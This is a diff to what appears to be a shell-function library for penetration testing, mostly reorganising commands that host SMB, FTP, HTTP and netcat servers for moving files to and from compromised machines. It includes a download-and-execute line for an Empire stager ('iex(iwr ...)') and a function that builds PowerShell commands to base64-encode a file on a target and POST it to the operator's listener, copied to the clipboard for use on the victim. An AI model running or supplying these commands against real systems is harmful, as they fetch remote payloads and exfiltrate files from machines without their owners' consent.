@@ -22,12 +22,14 @@ Commands to download a file from server
 -------------------------------------
 nb-srv-smb              hosts an impacket smb server in current dir
 nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
-nb-srv-ftp              hosts a python ftp server in current dir
+nb-srv-ftp-down         hosts a python ftp server in current dir
 
-Commands to upload a file to a server
--------------------------------------
+Commands to upload a file to a server/listener
+----------------------------------------------
+nb-srv-ftp-up           hosts a python ftp server in current dir
 nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
-nb-srv-smb-http         hosts an SMB over HTTP with WebDav
+nb-srv-smb-http         hosts an SMB over HTTP server with WebDav in current dir
+nb-srv-nc-b64-web       hosts a netcat server > decode b64 file in current dir
 
 General Commands
 -------------------------------------
@@ -36,12 +38,13 @@ nb-srv-empire-stager    command to download and execute empire stager in a targe
 nb-srv-install          install dependencies
 
 
+
+Commands to upload a file to a server/listener on LINUX
+-------------------------------------------------------
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
 nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
-nb-srv-nc-b64-web       hosts a netcat server > decode b64 file in current dir
-nb-srv-web-hosted       hosts a python web server in /srv, port as $1
-nb-srv-php-hosted       hosts a php web server in /srv, port as $1
+
 nb-srv-ftp-hosted       hosts a python ftp server in /srv
 nb-srv-updog-hosted     hosts an updog web server in /srv
 
@@ -138,7 +141,10 @@ iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
 }
 
 nb-srv-web() {
-	print -z "cd \"$HOME/desktop/server\" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000"
+  pushd "$HOME/desktop/server" &> /dev/null
+  __info "Serving content at $(hip) in $PWD"
+	sudo python3 -m http.server 8000
+  popd &> /dev/null
 }
 
 nb-srv-uploadserver() {
@@ -234,34 +240,6 @@ nb-srv-smtp() {
 	print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"
 }
 
-nb-srv-web-hosted() {
-    __info "Serving content from /srv"
-    if [ "$#" -eq  "1" ]
-    then
-        pushd /srv &> /dev/null
-        sudo python -m http.server $1
-        popd &> /dev/null
-    else
-        pushd /srv &> /dev/null
-        sudo python -m http.server 80
-        popd &> /dev/null
-    fi
-}
-
-nb-srv-php-hosted() {
-    __info "Serving content from /srv"
-    if [ "$#" -eq  "1" ]
-    then
-        pushd /srv &> /dev/null
-        sudo php -S 0.0.0.0:$1 
-        popd &> /dev/null
-    else
-        pushd /srv &> /dev/null
-        sudo php -S 0.0.0.0:80
-        popd &> /dev/null
-    fi
-}
-
 nb-srv-ftp-hosted() {
     __info "Serving content from /srv"
     pushd /srv &> /dev/null
@@ -314,8 +292,8 @@ nb-srv-nc-b64-web() {
     local path && __askvar path "FULL_PATH_TO_FILE"
 
     echo
-    __COMMAND1=$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))
-    __COMMAND2=Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \$b64
+    __COMMAND1="$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))"
+    __COMMAND2="Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \\$b64"
     echo "$__COMMAND2" | wl-copy
     echo "$__COMMAND1" | wl-copy
     __info "2 Commands to use on a target system copied to clipboard"
